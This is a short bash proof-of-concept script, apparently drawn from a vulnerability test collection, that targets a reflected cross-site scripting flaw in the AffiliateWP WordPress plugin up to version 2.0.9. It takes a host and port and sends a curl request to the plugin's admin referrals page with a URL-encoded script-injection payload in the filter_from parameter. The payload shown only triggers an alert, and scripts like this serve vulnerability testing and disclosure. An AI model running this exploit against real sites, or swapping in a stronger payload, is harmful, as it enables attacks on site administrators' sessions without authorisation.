#!/bin/bash

# https://wpvulndb.com/vulnerabilities/8835
# works for AffiliateWP <= 2.0.9

HOST=$1
PORT=$2

curl "http://$HOST:$PORT//wp-admin/admin.php?page=affiliate-wp-referrals&filter_from=%27%3C%2Fscript%3E%3Cscript%3Ealert%2842%29%3C%2Fscript%3E"
